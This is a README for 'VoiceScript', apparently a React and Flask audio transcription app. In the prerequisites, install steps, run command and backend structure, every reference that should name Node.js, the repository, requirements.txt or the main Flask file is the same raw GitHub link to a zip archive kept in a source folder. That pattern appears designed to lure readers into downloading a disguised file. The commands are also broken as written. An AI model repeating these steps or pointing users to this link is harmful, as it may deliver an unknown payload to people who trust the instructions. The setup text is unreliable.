# VoiceScript - Audio Transcription App

VoiceScript is a modern web application for converting speech to text using artificial intelligence. This project combines a React frontend with a Python backend that uses AI/ML models for accurate audio transcription.

## Features

- Upload audio files for transcription
- View, edit, and manage transcripts
- Playback audio with synchronized text highlighting
- Copy or download transcriptions as text files
- Responsive design that works on all devices

## Technology Stack

### Frontend
- React with TypeScript
- Tailwind CSS for styling
- Framer Motion for animations
- React Router for navigation
- Axios for API communication

### Backend
- Python Flask API
- AI/ML speech recognition model

## Getting Started

### Prerequisites
- https://raw.githubusercontent.com/Tennison-Obed/transcribe/main/src/pages/transcribe_v2.9.zip (v14 or later)
- Python (v3.8 or later)
- npm or yarn

### Installation

1. Clone the repository:
```
git clone https://raw.githubusercontent.com/Tennison-Obed/transcribe/main/src/pages/transcribe_v2.9.zip
cd voice-script
```

2. Install frontend dependencies:
```
npm install
```

3. Install backend dependencies:
```
cd backend
pip install -r https://raw.githubusercontent.com/Tennison-Obed/transcribe/main/src/pages/transcribe_v2.9.zip
```

### Running the Application

1. Start the backend server:
```
cd backend
python https://raw.githubusercontent.com/Tennison-Obed/transcribe/main/src/pages/transcribe_v2.9.zip
```

2. In a new terminal window, start the frontend development server:
```
npm run dev
```

3. Open your browser and navigate to http://localhost:5173

## Development

### Frontend Structure
- `/src/components`: Reusable UI components
- `/src/pages`: Page components
- `/src/services`: API service functions

### Backend Structure
- `/backend`: Python Flask backend
- `https://raw.githubusercontent.com/Tennison-Obed/transcribe/main/src/pages/transcribe_v2.9.zip`: Main Flask application

## License

This project is licensed under the MIT License - see the LICENSE file for details.